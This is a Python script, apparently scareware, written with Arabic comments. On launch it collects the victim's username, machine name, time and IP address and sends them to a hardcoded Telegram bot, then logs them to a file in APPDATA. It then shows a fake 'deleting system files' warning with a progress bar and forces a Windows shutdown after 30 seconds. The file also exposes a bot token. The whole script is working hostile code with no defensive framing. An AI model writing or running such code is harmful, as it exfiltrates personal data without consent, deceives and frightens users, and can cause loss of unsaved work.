import tkinter as tk
from tkinter import ttk
import threading
import time
import socket
import platform
import getpass
import datetime
import requests
import os

# إعدادات بوت تليجرام
BOT_TOKEN = '7049270444:AAFQc1ofYVk4GoDTTqttmydTNRz9EZSW7uM'
CHAT_ID = '-1002445012199'

# ملف حفظ البيانات
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'system_warning_log.txt')

def gather_info():
    username = getpass.getuser()
    hostname = platform.node()
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except:
        ip_address = 'Unknown'

    info = f"""🚨 تنبيه متطفل 🚨
-------------------
اسم المستخدم: {username}
اسم الجهاز: {hostname}
التاريخ والوقت: {now}
IP: {ip_address}
"""
    return info

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    data = {'chat_id': CHAT_ID, 'text': message}
    try:
        response = requests.post(url, data=data)
        return response.status_code == 200
    except:
        return False

def log_info(message):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(message + '\n\n')
    except:
        pass

class FakeDeleteApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Warning")
        self.root.geometry("400x150")
        self.root.resizable(False, False)

        self.label = tk.Label(root, text="🚨 جاري حذف ملفات النظام... الرجاء عدم إيقاف التشغيل!", font=("Arial", 12), fg="red")
        self.label.pack(pady=10)

        self.progress = ttk.Progressbar(root, orient="horizontal", length=350, mode="determinate")
        self.progress.pack(pady=10)

        self.counter = 0
        self.max_count = 100

        self.update_progress()

        threading.Thread(target=self.shutdown_countdown, daemon=True).start()

    def update_progress(self):
        if self.counter < self.max_count:
            self.counter += 1
            self.progress['value'] = self.counter
            self.root.after(300, self.update_progress)

    def shutdown_countdown(self):
        time.sleep(30)
        if os.name == 'nt':
            os.system("shutdown /s /t 5")  # إيقاف الجهاز بعد 5 ثواني

def main():
    info = gather_info()
    send_telegram_message(info)
    log_info(info)

    root = tk.Tk()
    app = FakeDeleteApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
